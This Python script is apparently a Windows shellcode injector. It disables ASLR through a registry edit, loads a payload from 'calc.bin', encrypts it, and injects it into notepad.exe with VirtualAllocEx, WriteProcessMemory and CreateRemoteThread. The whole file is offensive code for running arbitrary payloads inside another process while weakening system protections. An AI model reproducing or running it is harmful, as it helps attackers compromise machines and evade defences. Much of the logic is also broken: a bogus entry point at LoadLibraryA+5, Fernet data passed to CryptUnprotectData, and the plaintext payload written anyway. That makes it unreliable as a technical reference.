import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes
import sys

# # Disable ASLR
# subprocess.call(["cmd", "/c", "REG DELETE \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\" /v \"MoveImages\""])


# Disable ASLR
subprocess.run(["REG", "ADD", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/t", "REG_DWORD", "/d", "0", "/f"], shell=True)

# Enable ASLR
# subprocess.run(["REG", "DELETE", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", "/v", "MoveImages", "/f"], shell=True)

with open("calc.bin", "rb") as f:
    payload = f.read()


# Encrypt the payload using Fernet
key = Fernet.generate_key()
f = Fernet(key)
encrypted_payload = f.encrypt(payload)

# Find the process to inject the payload into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Decrypt the payload in the target process
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x04)
decryption_key_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(key), 0x3000, 0x04)
windll.kernel32.WriteProcessMemory(process_handle, decryption_key_address, key, len(key), None)
decryption_function_address = windll.kernel32.GetProcAddress(loaded_module, "CryptUnprotectData")

# Create a remote thread in the target process to decrypt the payload
windll.kernel32.CreateRemoteThread(process_handle, None, 0, decryption_function_address, decryption_key_address, decrypted_payload_address, None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, payload, len(payload), None)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)